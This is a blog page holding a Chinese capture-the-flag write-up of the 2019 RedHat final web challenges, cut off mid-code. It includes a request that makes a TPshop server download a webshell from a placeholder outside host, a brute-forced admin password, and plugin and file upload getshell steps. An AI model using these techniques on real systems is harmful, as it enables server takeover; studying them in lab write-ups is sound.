@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="Chinese">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/head.jpg?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/head.jpg?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/head.jpg?v=7.3.0">
+  <link rel="mask-icon" href="/images/head.jpg?v=7.3.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.3.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    }
+  };
+</script>
+
+  <meta name="description" content="Threezh1 Jokuuy Playmaker 2019年11月23日 离结束只有40多分钟了，web题ak了之后不会修… 把wp写一下吧。web四个题都是简单的代码审计题。 粤湾基金地址： http://172.16.9.41:9005/  是一个TPshop的商城框架，界面如图所示：  漏洞文件：\application\home\controller\Test.php 漏洞函数：dlfi">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019 RedHat决赛 Writeup">
+<meta property="og:url" content="http://yoursite.com/2019/12/18/2019 Redhat决赛 Writeup/index.html">
+<meta property="og:site_name" content="Threezh1&#39;s blog">
+<meta property="og:description" content="Threezh1 Jokuuy Playmaker 2019年11月23日 离结束只有40多分钟了，web题ak了之后不会修… 把wp写一下吧。web四个题都是简单的代码审计题。 粤湾基金地址： http://172.16.9.41:9005/  是一个TPshop的商城框架，界面如图所示：  漏洞文件：\application\home\controller\Test.php 漏洞函数：dlfi">
+<meta property="og:locale" content="Chinese">
+<meta property="og:image" content="c:/Users/ThreeZhi/AppData/Roaming/Typora/typora-user-images/image-20191123151942020.png">
+<meta property="og:image" content="c:/Users/ThreeZhi/AppData/Roaming/Typora/typora-user-images/image-20191123152927253.png">
+<meta property="og:image" content="c:/Users/ThreeZhi/AppData/Roaming/Typora/typora-user-images/image-20191123155227208.png">
+<meta property="og:updated_time" content="2019-12-18T03:35:15.280Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019 RedHat决赛 Writeup">
+<meta name="twitter:description" content="Threezh1 Jokuuy Playmaker 2019年11月23日 离结束只有40多分钟了，web题ak了之后不会修… 把wp写一下吧。web四个题都是简单的代码审计题。 粤湾基金地址： http://172.16.9.41:9005/  是一个TPshop的商城框架，界面如图所示：  漏洞文件：\application\home\controller\Test.php 漏洞函数：dlfi">
+<meta name="twitter:image" content="c:/Users/ThreeZhi/AppData/Roaming/Typora/typora-user-images/image-20191123151942020.png">
+  <link rel="canonical" href="http://yoursite.com/2019/12/18/2019 Redhat决赛 Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>2019 RedHat决赛 Writeup | Threezh1's blog</title>
+  <meta name="generator" content="Hexo 3.8.0">
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?41896264c6b7bfbb2d9ae9719e4440c2";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="Chinese">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Threezh1's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">分享学习、分享想法</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-threeday">
+      
+    
+
+    <a href="http://119.3.219.188/" rel="noopener" target="_blank"><i class="menu-item-icon fa fa-fw fa-Threeday"></i> <br>Threeday</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content page-post-detail">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/18/2019 Redhat决赛 Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Threezh1">
+      <meta itemprop="description" content="Share learn & Share life.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Threezh1's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">2019 RedHat决赛 Writeup
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-12-18 11:27:29 / Geändert am: 11:35:15" itemprop="dateCreated datePublished" datetime="2019-12-18T11:27:29+08:00">2019-12-18</time>
+            </span>
+          
+            
+
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">in</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><em>Threezh1 Jokuuy Playmaker 2019年11月23日</em></p>
+<p>离结束只有40多分钟了，web题ak了之后不会修… 把wp写一下吧。web四个题都是简单的代码审计题。</p>
+<h2 id="粤湾基金"><a href="#粤湾基金" class="headerlink" title="粤湾基金"></a>粤湾基金</h2><p>地址： <a href="http://172.16.9.41:9005/" target="_blank" rel="noopener">http://172.16.9.41:9005/</a> </p>
+<p>是一个TPshop的商城框架，界面如图所示：</p>
+<p><img src="C:\Users\ThreeZhi\AppData\Roaming\Typora\typora-user-images\image-20191123151942020.png" alt="image-20191123151942020"></p>
+<p>漏洞文件：\application\home\controller\Test.php</p>
+<p>漏洞函数：dlfile()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dlfile</span><span class="params">($file_url, $save_to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_POST, <span class="number">0</span>); </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$file_url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        $file_content = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        $downloaded_file = fopen($save_to, <span class="string">'w'</span>);</span><br><span class="line">        fwrite($downloaded_file, $file_content);</span><br><span class="line">        fclose($downloaded_file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本地写一个包含一句话的木马(shell.txt)然后访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Home/Test/dlfile?file_url=http://xxxx/shell.txt&amp;save_to=/var/www/html/shell.php</span><br></pre></td></tr></table></figure>
+<p>然后用蚁剑连接：/shell.php 即可。</p>
+<a id="more"></a>
+<h2 id="粤湾期货"><a href="#粤湾期货" class="headerlink" title="粤湾期货"></a>粤湾期货</h2><p>地址： <a href="http://172.16.9.41:9006/" target="_blank" rel="noopener">http://172.16.9.41:9006/</a></p>
+<p>是一个emlog搭建的站点，以前打算审的，放弃了。界面如下：</p>
+<p><img src="C:\Users\ThreeZhi\AppData\Roaming\Typora\typora-user-images\image-20191123152927253.png" alt="image-20191123152927253"></p>
+<p>找到后台路径：/admin/</p>
+<p>用户名admin，爆破出密码为admin12345 进入后台</p>
+<p>后台有一个上传插件的点，验证压缩包格式的代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">emUnZip</span><span class="params">($zipfile, $path, $type = <span class="string">'tpl'</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!class_exists(<span class="string">'ZipArchive'</span>, <span class="keyword">FALSE</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;<span class="comment">//zip模块问题</span></span><br><span class="line">    &#125;</span><br><span class="line">    $zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    <span class="keyword">if</span> (@$zip-&gt;open($zipfile) !== <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;<span class="comment">//文件权限问题</span></span><br><span class="line">    &#125;</span><br><span class="line">    $r = explode(<span class="string">'/'</span>, $zip-&gt;getNameIndex(<span class="number">0</span>), <span class="number">2</span>);</span><br><span class="line">    $dir = <span class="keyword">isset</span>($r[<span class="number">0</span>]) ? $r[<span class="number">0</span>] . <span class="string">'/'</span> : <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($type) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'tpl'</span>:</span><br><span class="line">            $re = $zip-&gt;getFromName($dir . <span class="string">'header.php'</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">false</span> === $re)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'plugin'</span>:</span><br><span class="line">            $plugin_name = substr($dir, <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">            $re = $zip-&gt;getFromName($dir . $plugin_name . <span class="string">'.php'</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">false</span> === $re)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+<p>从代码可知，一个插件名字叫做plugin，压缩包里面的内容就需要为plugin/plugin.php，不然格式就会验证错误。</p>
+<p>将一句话的shell写入plugin.php，上传之后会被解压，然后访问即可getshell。</p>
+<h2 id="粤湾投资"><a href="#粤湾投资" class="headerlink" title="粤湾投资"></a>粤湾投资</h2><p>地址： <a href="http://172.16.9.41:9007/" target="_blank" rel="noopener">http://172.16.9.41:9007/</a></p>
+<p>陈师傅以前审过的一个cms，快速的拿到了一血。当时没有截到这个cms的图，所以就直接看具体的代码吧：</p>
+<p>任意文件上传：</p>
+<p>echo/Apps/Home/Controller/UploadfileController.class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * [index 文件上传代码]</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> [type] [description]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(IS_POST)&#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * 1、如果是图片直接调用uploadPhoto()</span></span><br><span class="line"><span class="comment">		 * 2、如果是替他附件则按照当前配置设置</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		$type = I(<span class="string">'post.type'</span>,<span class="string">'files'</span>);</span><br><span class="line">		$saveDir = I(<span class="string">'post.savedir'</span>);</span><br><span class="line">		$thumbw = I(<span class="string">'post.thumbw'</span>);</span><br><span class="line">		$thumbh = I(<span class="string">'post.thumbh'</span>);</span><br><span class="line">		$filesize = I(<span class="string">'post.filesize'</span>);</span><br><span class="line">		<span class="keyword">if</span>($type == <span class="string">'images'</span> || preg_match(<span class="string">'/^image\//'</span>, $_FILES[<span class="string">'Filedata'</span>][<span class="string">'type'</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">			$type = <span class="string">"images"</span>;</span><br><span class="line">			<span class="comment">//是否添加水印</span></span><br><span class="line">			$water = I(<span class="string">'post.water'</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>($water)&#123;</span><br><span class="line">				$water_site = C(<span class="string">'SITE_SYSTEM_IMG_WATER'</span>);</span><br><span class="line">				$water_new = <span class="keyword">isset</span>($water_site) &amp;&amp; !<span class="keyword">empty</span>($water_site) ? $water_site : C(<span class="string">'SYSTEM_IMG_WATER'</span>);</span><br><span class="line">			    <span class="comment">//$info = uploadPhoto('photo/'.$type.'',$thumbw,$thumbh,array('open'=&gt;1));</span></span><br><span class="line">				$info = uploadPhoto($saveDir.<span class="string">'/'</span>.$type,$thumbw,$thumbh,$water_new,$filesize);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$info = uploadPhoto($saveDir.<span class="string">'/'</span>.$type,$thumbw,$thumbh,<span class="string">''</span>,$filesize);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(!is_array($info))&#123;</span><br><span class="line">				$error_data[<span class="string">'info'</span>] = $info;</span><br><span class="line">				$error_data[<span class="string">'status'</span>] = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;ajaxReturn($error_data);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			$file[<span class="string">'oringinal_type'</span>] = <span class="string">'images'</span>;</span><br><span class="line">			$file[<span class="string">'status'</span>] = <span class="number">1</span>;</span><br><span class="line">			$file[<span class="string">'name'</span>] = $_FILES[<span class="string">'Filedata'</span>][<span class="string">'name'</span>][<span class="number">0</span>];</span><br><span class="line">			$file[<span class="string">'savename'</span>] = $info[<span class="number">0</span>][<span class="string">'savename'</span>];</span><br><span class="line">			$file[<span class="string">'photo'</span>] = substr($info[<span class="number">0</span>][<span class="string">'savepath'</span>],<span class="number">1</span>).$info[<span class="number">0</span>][<span class="string">'savename'</span>];</span><br><span class="line">			$file[<span class="string">'thumb'</span>] = $info[<span class="number">0</span>][<span class="string">'thumbpath'</span>];</span><br><span class="line">			$file[<span class="string">'location'</span>] = <span class="string">'upload'</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;ajaxReturn($file);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$type = <span class="string">'files'</span>;</span><br><span class="line">			$upload = <span class="keyword">new</span> \Think\Upload();</span><br><span class="line">			$upload-&gt;maxSize = $filesize*<span class="number">1024</span>; <span class="comment">//文件上传的最大文件大小，附件最大100M</span></span><br><span class="line">			$upload-&gt;rootPath = <span class="string">"./"</span>; <span class="comment">//文件上传保存的根路径</span></span><br><span class="line">			$upload-&gt;savePath = $upload-&gt;rootPath.<span class="string">"Public/Uploads/"</span>.$saveDir.<span class="string">"/"</span> . $type .<span class="string">"/"</span>;<span class="comment">//文件上传的保存路径</span></span><br><span class="line">			$upload-&gt;saveName = date(<span class="string">"YmdHis"</span>).<span class="string">"_"</span>.uniqid(); <span class="comment">//上传文件的保存规则</span></span><br><span class="line">			$upload-&gt;replace = <span class="keyword">true</span>; <span class="comment">//存在同名文件是否是覆盖</span></span><br><span class="line">			$upload-&gt;autoSub = <span class="keyword">true</span>;<span class="comment">//自动使用子目录保存上传文件</span></span><br><span class="line">			$upload-&gt;subName = date(<span class="string">"Ymd"</span>);<span class="comment">//子目录创建方式，采用数组或者字符串方式定义</span></span><br><span class="line">			$upload-&gt;hash = <span class="keyword">true</span>;<span class="comment">//是否生成文件的hash编码 默认为true</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(!$info = $upload-&gt;upload())&#123;</span><br><span class="line">				$error_data[<span class="string">'status'</span>] = <span class="number">0</span>;</span><br><span class="line">				$error_data[<span class="string">'info'</span>] = $upload-&gt;getError();</span><br><span class="line">				<span class="keyword">$this</span>-&gt;ajaxReturn($error_data);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">//处理文件图标</span></span><br><span class="line">				<span class="comment">//excel</span></span><br><span class="line">				<span class="keyword">if</span>(in_array($info[<span class="number">0</span>][<span class="string">'ext'</span>], <span class="keyword">array</span>(<span class="string">'xls'</span>,<span class="string">'xlsx'</span>)))&#123;</span><br><span class="line">					$info[<span class="number">0</span>][<span class="string">'ext'</span>] = <span class="string">'xls'</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">//ppt</span></span><br><span class="line">				<span class="keyword">if</span>(in_array($info[<span class="number">0</span>][<span class="string">'ext'</span>], <span class="keyword">array</span>(<span class="string">'ppt'</span>,<span class="string">'pptx'</span>)))&#123;</span><br><span class="line">					$info[<span class="number">0</span>][<span class="string">'ext'</span>] = <span class="string">'ppt'</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">//word</span></span><br><span class="line">				<span class="keyword">if</span>(in_array($info[<span class="number">0</span>][<span class="string">'ext'</span>], <span class="keyword">array</span>(<span class="string">'doc'</span>,<span class="string">'docx'</span>)))&#123;</span><br><span class="line">					$info[<span class="number">0</span>][<span class="string">'ext'</span>] = <span class="string">'doc'</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">//音频</span></span><br><span class="line">				<span class="keyword">if</span>(in_array($info[<span class="number">0</span>][<span class="string">'ext'</span>], <span class="keyword">array</span>(<span class="string">'wma'</span>,<span class="string">'mp3'</span>,<span class="string">'mid'</span>,<span class="string">'wav'</span>)))&#123;</span><br><span class="line">					$info[<span class="number">0</span>][<span class="string">'ext'</span>] = <span class="string">'mp3'</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">//视频</span></span><br><span class="line">				<span class="keyword">if</span>(in_array($info[<span class="number">0</span>][<span class="string">'ext'</span>], <span class="keyword">array</span>(<span class="string">'avi'</span>,<span class="string">'mov'</span>,<span class="string">'mpeg'</span>,<span class="string">'mpg'</span>,<span class="string">'swf'</span>,<span class="string">'mp4'</span>)))&#123;</span><br><span class="line">					$info[<span class="number">0</span>][<span class="string">'ext'</span>] = <span class="string">'vedio'</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">//zip</span></span><br><span class="line">				<span class="keyword">if</span>(in_array($info[<span class="number">0</span>][<span class="string">'ext'</span>], <span class="keyword">array</span>(<span class="string">'zip'</span>,<span class="string">'rar'</span>,<span class="string">'7z'</span>)))&#123;</span><br><span class="line">					$info[<span class="number">0</span>][<span class="string">'ext'</span>] = <span class="string">'zip'</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">//判断是否存在文件不存在则取默认图片</span></span><br><span class="line">				<span class="keyword">if</span>(!file_exists(<span class="string">"./Public/images/uploadfile/"</span>.$info[<span class="number">0</span>][<span class="string">'ext'</span>].<span class="string">".png"</span>))&#123;</span><br><span class="line">					$info[<span class="number">0</span>][<span class="string">'ext'</span>] = <span class="string">"readme"</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				$info[<span class="number">0</span>][<span class="string">'status'</span>] = <span class="number">1</span>;</span><br><span class="line">				$info[<span class="number">0</span>][<span class="string">'oringinal_type'</span>] = <span class="string">'files'</span>;</span><br><span class="line">				$info[<span class="number">0</span>][<span class="string">'savepathall'</span>] = substr($info[<span class="number">0</span>][<span class="string">'savepath'</span>],<span class="number">1</span>).$info[<span class="number">0</span>][<span class="string">'savename'</span>];</span><br><span class="line">				$info[<span class="number">0</span>][<span class="string">'location'</span>] = <span class="string">'upload'</span>;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;ajaxReturn($info[<span class="number">0</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		 <span class="comment">//缩略图配置</span></span><br><span class="line">		$site_thumbw = C(<span class="string">'SITE_SYSTEM_THUMB_WIDTH'</span>);</span><br><span class="line">		$site_thumbh = C(<span class="string">'SITE_SYSTEM_THUMB_HEIGHT'</span>);</span><br><span class="line">		$thumbw = <span class="keyword">isset</span>($site_thumbw) &amp;&amp; !<span class="keyword">empty</span>($site_thumbw) ? C(<span class="string">'SITE_SYSTEM_THUMB_WIDTH'</span>) : C(<span class="string">'SYSTEM_THUMB_WIDTH'</span>);</span><br><span class="line">		$thumbh = <span class="keyword">isset</span>($site_thumbh) &amp;&amp; !<span class="keyword">empty</span>($site_thumbh) ? C(<span class="string">'SITE_SYSTEM_THUMB_HEIGHT'</span>) : C(<span class="string">'SYSTEM_THUMB_HEIGHT'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;thumbw = I(<span class="string">'get.thumbw'</span>,$thumbw);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;thumbh = I(<span class="string">'get.thumbh'</span>,$thumbh);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;thumbw = <span class="keyword">$this</span>-&gt;thumbw === <span class="number">0</span> ? $thumbw : <span class="keyword">$this</span>-&gt;thumbw;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;thumbh = <span class="keyword">$this</span>-&gt;thumbh === <span class="number">0</span> ? $thumbh : <span class="keyword">$this</span>-&gt;thumbh;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;type = I(<span class="string">'get.type'</span>,<span class="string">''</span>); <span class="comment">//类型</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;myid = I(<span class="string">'get.myid'</span>,<span class="string">''</span>); <span class="comment">//返回容器内容的值</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;iframe = I(<span class="string">'get.iframe'</span>,<span class="string">''</span>); <span class="comment">//返回的iframe容器</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;field = I(<span class="string">'get.field'</span>,<span class="string">''</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;returntype = I(<span class="string">'get.returntype'</span>,<span class="string">'multiple'</span>); <span class="comment">//返回文件的个数类型，单个-single，多个-multiple，默认是多个</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//控制上传文件大小</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;filesize = I(<span class="string">'get.filesize'</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;filesize))&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;type == <span class="string">'images'</span>)&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;filesize = <span class="number">3072</span>; <span class="comment">//图片默认3M</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;filesize = <span class="number">102400</span>; <span class="comment">//附件默认100M</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//上传目录</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;savedir = I(<span class="string">'get.savedir'</span>,<span class="string">'uploadfile'</span>);</span><br><span class="line">		<span 